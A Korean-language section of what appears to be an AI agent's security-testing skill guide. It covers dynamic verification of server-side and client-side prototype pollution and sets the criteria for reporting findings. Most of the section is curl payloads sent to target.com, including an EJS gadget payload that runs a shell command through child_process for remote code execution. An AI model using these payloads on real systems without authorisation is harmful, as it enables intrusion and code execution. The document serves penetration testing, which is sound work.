### Phase 2: 동적 테스트 (검증)


**서버사이드 Prototype Pollution 테스트:**

1. `__proto__` 키를 포함한 JSON 페이로드 전송:
```bash
# 기본 __proto__ 페이로드
curl -X POST "https://target.com/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "true"}}'

# constructor.prototype 경로
curl -X POST "https://target.com/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"polluted": "true"}}}'
```

2. 오염 확인 — 오염된 속성이 다른 응답에 반영되는지 확인:
```bash
# 오염 후 다른 엔드포인트에서 빈 객체에 해당 속성이 존재하는지 확인
# 예: 사용자 정보 API 응답에 "polluted" 필드가 추가되었는지
curl -s "https://target.com/api/user/profile" | grep "polluted"

# 또는 서버 상태 변화 (500 에러, 다른 응답 구조 등) 관찰
```

3. 가젯 활용 테스트 (가젯을 식별한 경우):
```bash
# EJS 가젯 예시 — RCE
curl -X POST "https://target.com/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"id\");s"}}'

# 이후 EJS 템플릿 렌더링을 트리거하는 페이지 요청
curl -s "https://target.com/dashboard"
```

**쿼리 파라미터 기반 테스트 (qs 파서):**
```bash
# qs 파서가 중첩 객체를 허용하는 경우
curl -s "https://target.com/api/search?__proto__[polluted]=true"
curl -s "https://target.com/api/search?constructor[prototype][polluted]=true"
```

**클라이언트사이드 Prototype Pollution 테스트:**
- curl로는 재현 불가. webapp-testing 스킬이나 Playwright 등 브라우저 자동화 도구가 있으면 활용한다.
- URL fragment(`#__proto__[polluted]=true`) 또는 URL 파라미터 기반 CSPP는 브라우저에서만 테스트 가능하다.
- 브라우저 도구가 없으면 "후보 (브라우저 테스트 필요)"로 보고한다.

**검증 기준:**
- **확인됨**: 페이로드 전송 후 프로토타입이 실제로 오염되어 다른 응답/동작에 영향을 미치는 것을 직접 확인함 (응답에 오염된 속성 반영, 에러 발생, 가젯 체인 실행 등)
- **후보**: 소스코드상 취약 패턴이 존재하지만 동적 테스트로 오염을 확인하지 못함
- **보고서 제외**: 동적 테스트 결과 키 필터링 등으로 오염이 차단되는 것을 확인한 경우
